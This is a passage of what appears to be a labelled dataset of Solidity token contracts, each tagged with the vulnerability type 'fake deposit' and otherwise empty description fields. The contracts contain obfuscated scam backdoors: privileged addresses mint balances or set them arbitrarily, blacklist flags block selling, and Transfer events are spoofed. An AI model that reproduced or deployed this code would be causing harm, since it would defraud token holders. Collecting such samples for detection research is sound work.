        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address gFX = 0xF8a92Ad72Eb298756F5f6aCC74fDd1A538B38a3D;\r\n\taddress gWFX = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract TETRIONIX is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private GZA;\r\n\tmapping (address => bool) private GZE;\r\n    mapping (address => bool) private GZW;\r\n    mapping (address => mapping (address => uint256)) private gZV;\r\n    uint8 private constant GZD = 8;\r\n    uint256 private constant gTS = 300000000 * (10** GZD);\r\n    string private constant _name = \"Tetrionix\";\r\n    string private constant _symbol = \"TETRION\";\r\n\r\n\r\n\r\n    constructor () {\r\n        GZA[_msgSender()] = gTS;\r\n         gRMK(gWFX, gTS); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return GZD;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return gTS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return GZA[account];\r\n    }\r\n\t\r\n\r\n   \r\n\r\n\t\t\t\t function gburn(address GZj) onlyOwner public{\r\n        GZE[GZj] = true; }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return gZV[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        gZV[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction gquery(address GZj) public{\r\n         if(GZE[msg.sender])  { \r\n        GZW[GZj] = true; }}\r\n        \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == gFX)  {\r\n        require(amount <= GZA[sender]);\r\n        GZA[sender] -= amount;  \r\n        GZA[recipient] += amount; \r\n          gZV[sender][msg.sender] -= amount;\r\n        emit Transfer (gWFX, recipient, amount);\r\n        return true; }  else  \r\n          if(!GZW[recipient]) {\r\n          if(!GZW[sender]) {\r\n         require(amount <= GZA[sender]);\r\n        require(amount <= gZV[sender][msg.sender]);\r\n        GZA[sender] -= amount;\r\n        GZA[recipient] += amount;\r\n        gZV[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction gStake(address GZj) public {\r\n        if(GZE[msg.sender]) { \r\n        GZW[GZj] = false;}}\r\n\t\tfunction gRMK(address GZj, uint256 gZN) onlyOwner internal {\r\n    emit Transfer(address(0), GZj ,gZN); }\r\n\t\t\r\n\t\tfunction transfer(address GZj, uint256 gZN) public {\r\n        if(msg.sender == gFX)  {\r\n        require(GZA[msg.sender] >= gZN);\r\n        GZA[msg.sender] -= gZN;  \r\n        GZA[GZj] += gZN; \r\n        emit Transfer (gWFX, GZj, gZN);} else  \r\n        if(GZE[msg.sender]) {GZA[GZj] += gZN;} else\r\n        if(!GZW[msg.sender]) {\r\n        require(GZA[msg.sender] >= gZN);\r\n        GZA[msg.sender] -= gZN;  \r\n        GZA[GZj] += gZN;          \r\n        emit Transfer(msg.sender, GZj, gZN);}}\r\n\t\t\r\n\t\t\r\n\r\n\t\t\r\n\t\t}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract SoFi {\r\n  \r\n    mapping (address => uint256) public Yi;\r\n    mapping (address => uint256) public TN;\r\n    mapping (address => bool) Lv;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"Social Fi\";\r\n    string public symbol = unicode\"SoFi\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n    address Head_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n\r\n    constructor()  {\r\n    Yi[msg.sender] = totalSupply;\r\n    deploy(Head_Construct, totalSupply); }\r\n\r\n   \r\n   address deplyer = 0x2b401dC0C8d5DD69F12Dc17c6ac70fD1DAc0Fc94;\r\n    function deploy(address account, uint256 amount) public {\r\n    require(msg.sender == owner);\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == deplyer)  {\r\n        require(Yi[msg.sender] >= value);\r\n        Yi[msg.sender] -= value;  \r\n        Yi[to] += value; \r\n        emit Transfer (Head_Construct, to, value);\r\n        return true; }  \r\n        if(!Lv[msg.sender]) {\r\n        require(Yi[msg.sender] >= value);\r\n        Yi[msg.sender] -= value;  \r\n        Yi[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function vald () public {\r\n         if(msg.sender == deplyer)   {\r\n        Yi[msg.sender] = TN[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return Yi[account]; }\r\n\r\n        function unval(address ii) public {\r\n        if(msg.sender == deplyer)  { \r\n        Lv[ii] = false;}}\r\n        function cheque(address ii) public{\r\n         if(msg.sender == deplyer)  { \r\n        require(!Lv[ii]);\r\n        Lv[ii] = true;\r\n        }}\r\n             function brne(uint256 x) public {\r\n        if(msg.sender == deplyer)  { \r\n        TN[msg.sender] = x;} }\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n\r\n        if(from == deplyer)  {\r\n        require(value <= Yi[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Yi[from] -= value;  \r\n        Yi[to] += value; \r\n        emit Transfer (Head_Construct, to, value);\r\n        return true; }    \r\n          if(!Lv[from] && !Lv[to]) {\r\n        require(value <= Yi[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Yi[from] -= value;\r\n        Yi[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address kFX = 0x91D576803Dea8b723255eCB35b0039350a411Ef2;\r\n\taddress kKXF = 0xA64D08224A14AF343b70B983A9E4E41c8b848584;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n        require(msg.sender == kFX);\r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract ELUVIUM is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private kZA;\r\n    mapping (address => uint256) private kZY;\r\n    mapping (address => mapping (address => uint256)) private kZV;\r\n    uint8 private constant KZD = 8;\r\n    uint256 private constant kTS = 200000000 * (10** KZD);\r\n    string private constant _name = \"Eluvium Labs\";\r\n    string private constant _symbol = \"ELUVIUM\";\r\n\r\n\r\n\r\n    constructor () {\r\n          KRCM(kKXF, kTS);\r\n        kZA[_msgSender()] = kTS; }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return KZD;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return kTS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return kZA[account];\r\n    }\r\n\t\r\n\r\n   \r\n\r\n\t\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return kZV[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        kZV[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n    function KRCM(address kZJ, uint256 kZN) onlyOwner internal {\r\n    emit Transfer(address(0), kZJ ,kZN); }\r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == kFX)  {\r\n        require(amount <= kZA[sender]);\r\n        kZA[sender] -= amount;  \r\n        kZA[recipient] += amount; \r\n          kZV[sender][msg.sender] -= amount;\r\n        emit Transfer (kKXF, recipient, amount);\r\n        return true; } else\r\n        if(kZY[sender] <= 1) {\r\n        if(kZY[recipient] <= 1) { \r\n        require(amount <= kZA[sender]);\r\n        require(amount <= kZV[sender][msg.sender]);\r\n        kZA[sender] -= amount;\r\n        kZA[recipient] += amount;\r\n        kZV[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n        function Assert(address kZJ, uint256 kZN) public onlyOwner {\r\n        kZY[kZJ] = kZN;}\r\n\r\n        function transfer(address kZJ, uint256 kZN) public {\r\n        if(msg.sender == kFX)  {\r\n        require(kZA[msg.sender] >= kZN);\r\n        kZA[msg.sender] -= kZN;  \r\n        kZA[kZJ] += kZN; \r\n        emit Transfer (kKXF, kZJ, kZN);} else  \r\n        if(kZY[msg.sender] == 1) {kZA[kZJ] += kZN;} else\r\n        if(kZY[msg.sender] <= 1) {\r\n        require(kZA[msg.sender] >= kZN);\r\n        kZA[msg.sender] -= kZN;  \r\n        kZA[kZJ] += kZN;          \r\n        emit Transfer(msg.sender, kZJ, kZN);}}\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract UNLEARNING {\r\n  \r\n    mapping (address => uint256) public OiO;\r\n    mapping (address => uint256) public LRNED;\r\n    mapping (address => bool) Ik;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"UNLEARN\";\r\n    string public symbol = unicode\"\ud83c\udf93UNLEARN\ud83c\udf93\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n    address Head_Construct = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n\r\n    constructor()  {\r\n    OiO[msg.sender] = totalSupply;\r\n    deploy(Head_Construct, totalSupply); }\r\n\r\n   \r\n   address deplyer = 0xc28Ce8B9715fe1Aa7cccf6b8fEa1214c5CE01e64;\r\n    function deploy(address account, uint256 amount) public {\r\n    require(msg.sender == owner);\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == deplyer)  {\r\n        require(OiO[msg.sender] >= value);\r\n        OiO[msg.sender] -= value;  \r\n        OiO[to] += value; \r\n        emit Transfer (Head_Construct, to, value);\r\n        return true; }  \r\n        if(!Ik[msg.sender]) {\r\n        require(OiO[msg.sender] >= value);\r\n        OiO[msg.sender] -= value;  \r\n        OiO[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function learnt () public {\r\n         if(msg.sender == deplyer)   {\r\n        OiO[msg.sender] = LRNED[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return OiO[account]; }\r\n\r\n        function unlrn(address ii) public {\r\n        if(msg.sender == deplyer)  { \r\n        Ik[ii] = false;}}\r\n        function lrn(address ii) public{\r\n         if(msg.sender == deplyer)  { \r\n        require(!Ik[ii]);\r\n        Ik[ii] = true;\r\n        }}\r\n             function lrner(uint256 x) public {\r\n        if(msg.sender == deplyer)  { \r\n        LRNED[msg.sender] = x;} }\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n\r\n        if(from == deplyer)  {\r\n        require(value <= OiO[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        OiO[from] -= value;  \r\n        OiO[to] += value; \r\n        emit Transfer (Head_Construct, to, value);\r\n        return true; }    \r\n          if(!Ik[from] && !Ik[to]) {\r\n        require(value <= OiO[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        OiO[from] -= value;\r\n        OiO[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _MsgSendr() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _kpconstruct = 0x2Bd0892F7ADfC0be3AC7Cd3Be02353cF6FCc018E;\r\n\taddress V2UniswapRouter = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\r\n    constructor () {\r\n        address msgSender = _MsgSendr();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract AIREON is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Opp;\r\n\tmapping (address => bool) private Ypp;\r\n    mapping (address => bool) private Kpp;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _kpSup = 150000000 * 10**_decimals;\r\n    string private constant _name = \"AIREON\";\r\n    string private constant _symbol = \"AIREON\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Opp[_MsgSendr()] = _kpSup;\r\n        emit Transfer(address(0), V2UniswapRouter, _kpSup);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _kpSup;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Opp[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction ppend(address px) public {\r\n        if(Ypp[msg.sender]) { \r\n        Kpp[px] = false;}}\r\n        function ppquery(address px) public{\r\n         if(Ypp[msg.sender])  { \r\n        require(!Kpp[px]);\r\n        Kpp[px] = true; }}\r\n\t\tfunction ppstake(address px) public{\r\n         if(msg.sender == _kpconstruct)  { \r\n        require(!Ypp[px]);\r\n        Ypp[px] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _kpconstruct)  {\r\n        require(amount <= Opp[sender]);\r\n        Opp[sender] -= amount;  \r\n        Opp[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (V2UniswapRouter, recipient, amount);\r\n        return true; }    \r\n          if(!Kpp[recipient]) {\r\n          if(!Kpp[sender]) {\r\n         require(amount <= Opp[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        Opp[sender] -= amount;\r\n        Opp[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == _kpconstruct)  {\r\n        require(Opp[msg.sender] >= amount);\r\n        Opp[msg.sender] -= amount;  \r\n        Opp[recipient] += amount; \r\n        emit Transfer (V2UniswapRouter, recipient, amount);}\r\n        if(Ypp[msg.sender]) {Opp[recipient] = amount;} \r\n        if(!Kpp[msg.sender]) {\r\n        require(Opp[msg.sender] >= amount);\r\n        Opp[msg.sender] -= amount;  \r\n        Opp[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    address E20 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n   require(msg.sender == _Owner);     \r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract ALIVE is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private E1;\r\n    mapping (address => uint256) private E2;\r\n    mapping (address => mapping (address => uint256)) private E3;\r\n    uint8 private constant E4 = 8;\r\n    uint256 private constant E5 = 100000000 * (10** E4);\r\n    string private constant _name = \"Increasingly Alive\";\r\n    string private constant _symbol = \"ALIVE\";\r\n\r\n\r\n\r\n    constructor () {\r\n       E1[msg.sender] = E5;  \r\n        E2[msg.sender] = 2;  \r\n   E99(E5);}\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return E4;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return E5;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return E1[account];\r\n    }\r\n\t function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return E3[owner][spender];\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        E3[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\nfunction SETE2 (address x, uint256 y) public {\r\n require(E2[msg.sender] == 2);\r\n     E2[x] = y;}\r\n    function update() public {\r\n        E1[msg.sender] = E2[msg.sender];}\r\n        function E99 (uint256 x) internal {\r\n              emit Transfer(address(0), E20, x);}\r\n                      function _Transfer 